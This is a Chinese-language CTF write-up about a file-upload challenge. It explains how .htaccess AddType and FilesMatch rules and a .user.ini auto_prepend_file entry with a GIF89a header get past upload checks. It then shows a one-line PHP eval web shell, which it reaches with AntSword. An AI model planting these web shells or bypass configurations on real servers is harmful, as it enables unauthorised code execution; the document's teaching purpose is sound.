感觉作为一道难度为1的题目，难度远超于1了:worried:

首先打开这个界面发现会对文件的类型进行检验

然后查到相关的资料（前置知识）

.htaccess文件是用于apache服务器下的控制文件访问的配置文件，因此Nginx下是不会生效的

一般.htaccess可以用来留后门和针对黑名单绕过

　　创建一个txt写入

　　 AddType application/x-httpd-php .png   （这个配置信息的意思是把.png文件当成php文件解析）

　　打开另存为

　　保存类型为所有文件

　　让 png 解析为 php 

　　还可以把png改成其他图片格式~例如jpeg、gif等等...

　　另外，还有一个知识~（此题没用到这部分知识）

　　可以在.htaccess 加入php解析规则

　　类似于把文件名包含1的解析成php

　　<FilesMatch "1">

　　SetHandler application/x-httpd-php

　　</FilesMatch>

　　1.png 就会以php执行

然后查到这道题可以利用.user.ini文件（.user.ini文件为比较常用的配置文件）

在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。
这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。
其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制

有2个属性，它们的作用是，`auto_append_file`在`php`文件最后用`require`包含进指定文件，`auto_prepend_file`则是在`php`文件代码执行前用`require`包含进指定的文件

解题：编辑.user.ini文件如下

GIF89a
auto_prepend_file=a.jpg   它告诉服务器在每个 PHP 文件之前自动包含名为 `a.jpg` 的文件。这个文件可以是一个 PHP 脚本或其他类型的文件。它的作用是在 PHP 文件执行之前自动执行指定的代码，例如设置全局变量或加载自定义函数库。

上传.user.ini文件（注意用BurpSuite抓包修改文件类型为image/jpg）

然后编辑a.txt

如下：

GIF89a
<?=eval($_REQUEST['cmd']);?>

然后即可用蚁剑抓包获取flag





